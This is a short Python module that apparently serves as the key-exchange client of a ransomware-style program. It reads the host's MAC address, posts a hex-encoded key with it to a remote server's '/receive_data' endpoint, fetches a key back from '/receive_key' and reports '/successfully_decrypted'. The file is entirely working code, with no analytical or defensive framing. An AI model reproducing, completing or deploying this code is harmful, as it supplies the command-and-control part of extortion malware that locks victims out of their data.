import requests
from Crypto.Random import get_random_bytes
import uuid

def get_mac():
  mac_num = hex(uuid.getnode()).replace('0x', '').upper()
  mac = '-'.join(mac_num[i: i + 2] for i in range(0, 11, 2))
  return mac

def receive_key(url):
    mac = get_mac()
    data = {'mac':mac}
    
    url_send = url + '/receive_key'
    post = requests.post(url_send, data)
    return post.text

def successfully_decrypted(url):
    mac = get_mac()
    data = {'mac':mac}
    
    url_send = url + '/successfully_decrypted'
    post = requests.post(url_send, data)
    return post.text

def send_key(key, url):
    mac = get_mac()
    key=key.hex()
    data = {'mac':mac, 'key':key}
    
    url_send = url + '/receive_data'
    post = requests.post(url_send, data)
